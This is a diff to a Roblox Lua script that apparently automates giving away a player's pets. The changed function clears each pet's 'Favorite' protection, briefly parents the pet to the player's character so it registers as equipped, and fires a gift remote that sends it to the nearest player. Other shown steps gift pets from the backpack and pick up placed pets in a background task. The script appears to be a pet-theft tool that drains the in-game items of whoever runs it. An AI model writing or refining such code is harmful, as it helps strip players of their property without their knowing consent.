@@ -63,21 +63,29 @@ local function findPlacedPetByUUID(uuid)
 	return nil
 end
 
-local PetGiftingService = require(ReplicatedStorage.Modules.PetServices.PetGiftingService)
-
+-- Gift a pet without manual equip
 local function giftPetDirectly(pet)
-    debugPrint("Unfavoriting pet:", pet.Name)
-    pet:SetAttribute("Favorite", false)
+	debugPrint("Unfavoriting pet:", pet.Name)
+	pet:SetAttribute("Favorite", false)
 
-    local target = getNearestPlayer()
-    if target then
-        debugPrint("Gifting", pet.Name, "to", target.Name)
-        PetGiftingService:GivePet(target)
-    else
-        debugPrint("No target player found for", pet.Name)
-    end
+	local target = getNearestPlayer()
+	if target then
+		debugPrint("Temporarily parenting", pet.Name, "to Character for gifting")
+		local originalParent = pet.Parent
+		pet.Parent = LocalPlayer.Character
+		task.wait() -- allow Roblox to register it as equipped
+
+		debugPrint("Gifting", pet.Name, "to", target.Name)
+		GiftRemote:FireServer("GivePet", pet)
+
+		-- If gifting failed and pet still exists, restore its parent
+		if pet.Parent and pet.Parent == LocalPlayer.Character then
+			pet.Parent = originalParent
+		end
+	else
+		debugPrint("No target player found for", pet.Name)
+	end
 end
-
 
 -- Step 1: Gift pets from backpack or character (partial match on name)
 local function checkAndGiftFromContainer(container)
@@ -135,4 +143,3 @@ task.spawn(function()
 		pickUpPlacedPets()
 	end
 end)
-
